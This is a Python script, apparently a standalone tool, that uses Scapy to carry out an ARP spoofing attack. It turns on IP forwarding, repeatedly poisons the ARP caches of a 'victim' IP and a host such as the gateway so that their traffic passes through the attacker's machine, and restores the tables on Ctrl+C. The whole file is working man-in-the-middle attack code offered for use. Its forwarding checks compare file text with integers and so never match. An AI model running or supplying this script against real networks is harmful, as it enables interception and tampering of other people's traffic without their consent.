from scapy.all import Ether, ARP, srp, send
import argparse
import time


def enable_ip_route():
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            return
    print("Enabling IP Routing...")
    with open(file_path, "w") as f:
        print(1, file=f)
        print("IP Routing Enabled.")


def disable_ip_route():
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 0:
            return
    print("Disabling IP Routing...")
    with open(file_path, "w") as f:
        print(0, file=f)
        print("IP Routing Disabled.")


def get_mac(ip):
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src


def spoof(target_ip, host_ip, verbose=True):
    """Spoofs `target_ip` saying that we are `host_ip`.
    it is accomplished by changing the ARP cache of the
    target (poisoning)"""
    target_mac = get_mac(target_ip)
    # craft the arp 'is-at' operation packet, in other words; an ARP response
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    send(arp_response, verbose=0)
    if verbose:
        self_mac = ARP().hwsrc
        print(f"[+] Sent to {target_ip}: {host_ip} is-at {self_mac}")


def restore(target_ip, host_ip, verbose=True):
    """Restores the normal process of a regular network
    This is done by sending the original informations
    (real IP and MAC of `host_ip` ) to `target_ip`"""
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
    # sending the restoring packet
    # to restore the network to its normal process
    # we send each reply seven times for a good measure (count=7)
    send(arp_response, verbose=0, count=7)
    if verbose:
        print(f"[+] Sent to {target_ip}: {host_ip} is-at {host_mac}")


def arpspoof(target, host, verbose=True):
    """Performs an ARP spoof attack"""
    enable_ip_route()
    try:
        while True:
            # telling the `target` that we are the `host`
            spoof(target, host, verbose)
            # telling the `host` that we are the `target`
            spoof(host, target, verbose)
            time.sleep(1)
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C! restoring the network, please wait...")
        restore(target, host)
        restore(host, target)
        disable_ip_route()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARP spoof script")
    parser.add_argument("target", help="Victim IP Address to ARP poison")
    parser.add_argument("host", help="Host IP Address, the host you wish to intercept packets for (usually the gateway)")
    parser.add_argument("-v", "--verbose", action="store_true", help="verbosity, default is True (simple message each second)")
    args = parser.parse_args()
    target, host, verbose = args.target, args.host, args.verbose
    arpspoof(target, host, verbose)
